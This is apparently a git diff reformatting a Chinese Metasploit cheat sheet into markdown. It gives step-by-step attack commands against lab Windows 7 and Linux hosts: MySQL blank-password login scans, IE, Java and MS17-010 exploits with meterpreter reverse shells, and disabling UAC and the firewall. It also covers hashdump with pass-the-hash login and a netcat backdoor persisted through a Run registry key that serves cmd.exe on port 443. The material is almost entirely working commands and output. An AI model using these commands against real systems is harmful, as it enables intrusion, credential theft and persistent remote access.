@@ -2,22 +2,37 @@
 	https://blog.csdn.net/qq_21310689/article/details/85594699
 	
 	apt-get  install metasploit-framework
-	
+
 jobs -K 停止所有
 
+
+
+```
 msfconsole -qr /home/xiaoxiaoran/shell/win.rc
 msfconsole -qr /home/xiaoxiaoran/shell/linux.rc
+```
 
+```
 resource 1.txt
+```
 
+```
 systemctl restart postgresql  
 msfdb init 
 db_status
+```
 
+```
 search name:mysql type:exploit
 search platform:mysql   ‍‍缩小查询范围‍‍
 
-	@mysql扫描空密码@
+```
+
+
+
+## mysql扫描空密码
+
+```
 search mysql_login
 use auxiliary/scanner/mysql/mysql_login 
 show options 
@@ -25,15 +40,21 @@ set USERnAME root
 set BlANK_PASSWORDS true
 set rhosts 192.168.100.140
 run
+```
 
-	@ssh信息收集@
+## ssh信息收集
+
+```
 search ssh_version
 use auxiliary/scanner/ssh/ssh_version
 options
 set rhosts 192.168.100.140
 run
+```
 
-	@利用win7系统的IE浏览器漏洞获取shell@
+## 利用win7系统的IE浏览器漏洞获取shell
+
+```
 use exploit/windows/browser/ms14_064_ole_code_execution
 set payload windows/meterpreter/reverse_tcp 
 set lhost 192.168.100.143
@@ -41,15 +62,21 @@ set LPORT 4444
 options
 set target 1
 run
+```
 
-	@使用java7模块getshell@
+## 使用java7模块getshell
+
+```
 use exploit/multi/browser/java_jre17_driver_manager
 set payload java/meterpreter/reverse_tcp 
 set lhost 192.168.100.143
 set LPORT 4444
 run
+```
 
-	@使用ms17-010漏洞对win7进行@
+## 使用ms17-010漏洞对win7进行
+
+```
 Win7防火墙状态关闭   进行扫描确认是否存在漏洞
 use auxiliary/scanner/smb/smb_ms17_010
 set rhosts 192.168.100.129
@@ -63,14 +90,21 @@ options
 run
 
 查看权限 meterpreter > getuid
+```
 
-	@创建一个新用户来远程连接win7桌面@
+## 创建一个新用户来远程连接win7桌面
+
+```
 meterpreter > run post/windows/manage/enable_rdp
 meterpreter > run post/windows/manage/enable_rdp USERNAME=xiaoxiao PASSWORD=123456
 
 sudo rdesktop 192.168.100.129       
 
-	@关闭主机防护策略@
+```
+
+## 关闭主机防护策略
+
+```shell
 shell
 	netsh firewall add portopening TCP 4444 "xiaoxiao" ENABLE ALL   
 		创建一条防火墙规则允许4444端口访问网络
@@ -78,8 +112,11 @@ shell
 		ADD添加一个注册表项 -v创建键值 -t 键值类型 -d 键值的值  关闭UAC(通知用户是否对应用程序使用硬盘驱动器和系统文件授权)
 	cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 		开启win7系统主机的默认共享
+```
 
-	@使用hash值登录系统@
+## 使用hash值登录系统
+
+```
 meterpreter > hashdump
 	xiaoxiao:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
 
@@ -91,10 +128,13 @@ set SMBUser xiaoxiao
 set SMBPass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
 set SMBDomain WORKGROUP   //局域网中SMBDomain都是WORKGROUP如果是域用户需要配置域名称。
 run
+```
 
-	@配置一个后门程序,上传nc到Win7@
-meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
-meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'
+## 配置一个后门程序,上传nc到Win7## 
+
+```
+meterpreter > upload /usr/share/windows-binaries/nc.exe C:\windows\system32
+meterpreter > reg setval -k HKLM\software\microsoft\windows\currentversion\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'
 	注册表添加启动项执行nc反弹shell命令   -L 表示用户退出连接后重新进行端口侦听 -d 后台运行 -p 指定端口 -e prog 程序重定向，一旦连接，就执行
 shutdown -r -f -t 0
 	重启生效 -r 重启 -f 强制 -t 时间 0表示立刻
@@ -106,7 +146,11 @@ win7
 msf6 > connect 192.168.1.56 443
 nc -v 192.168.1.56 443
 
-	@Metapsloit 端口扫描@
+```
+
+## Metapsloit 端口扫描
+
+```
 运行的Nmap扫描是一个SYN扫描
 nmap -v -sV 192.168.100.0/24 -oA xiaoxiao
 	
@@ -122,46 +166,65 @@ run
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 192.168.100.140
 run
+```
 
-	@SMB版本扫描@
+
+
+## SMB版本扫描
+
 确定在目标上运行的是哪个版本的Windows，以及哪个Samba版本在Linux主机上。
+
+```
 use auxiliary/scanner/smb/smb_version
 set RHOSTS 192.168.100.140-141
 set THREADS 11
 run
+```
 
 !!如果我们现在发出hosts命令，则新获取的信息将存储在Metasploit的数据库中。
 
-	@空闲扫描@
+## 空闲扫描#
+
 Nmap的IPID空闲扫描允许我们在欺骗网络上另一主机的IP地址的同时扫描目标有点隐身。为了使这种类型的扫描能够正常工作，我们需要找到网络上空闲的主机，并使用增量或破碎小端增量的IPID序列。
+```
 use auxiliary/scanner/ip/ipidseq
 set RHOSTS 192.168.100.0/24
 set THREADS 50
 run
+```
 
 [*] 192.168.100.140's IPID sequence class: All zeros
 我们的扫描结果来看，我们有一些潜在的僵尸，我们可以用它来执行空闲扫描
 尝试使用192.168.100.140上的僵尸来扫描主机
 nmap -Pn -sI 192.168.100.140 192.168.100.2
 
-	@用Metasploit查找易受攻击的MSSQL系统@
+## 用Metasploit查找易受攻击的MSSQL系统
+
+```
 use auxiliary/scanner/mssql/mssql_ping
 set RHOSTS 192.168.100.140-141
-exploit
+exploit ```
+```
 
-	@FTP服务@
+## FTP服务
+
+```sh
 use auxiliary/scanner/ftp/ftp_version 
 set RHOSTS 192.168.100.140
 exploit
-	
-	@用smb_login扫描访问@
+```
+
+## 用smb_login扫描访问
+
 常见情况是拥有一个有效的用户名和密码组合，并且想知道你可以在哪里使用它。这是SMB登录检查扫描程序非常有用的地方，因为它将连接到一系列主机并确定用户名/密码组合是否可以访问目标。
+```
 use auxiliary/scanner/smb/smb_login
 set RHOSTS 192.168.100.129
 set SMBUser xiao
 set SMBPass xiao
 set THREADS 50
 run
+```
 
 
 
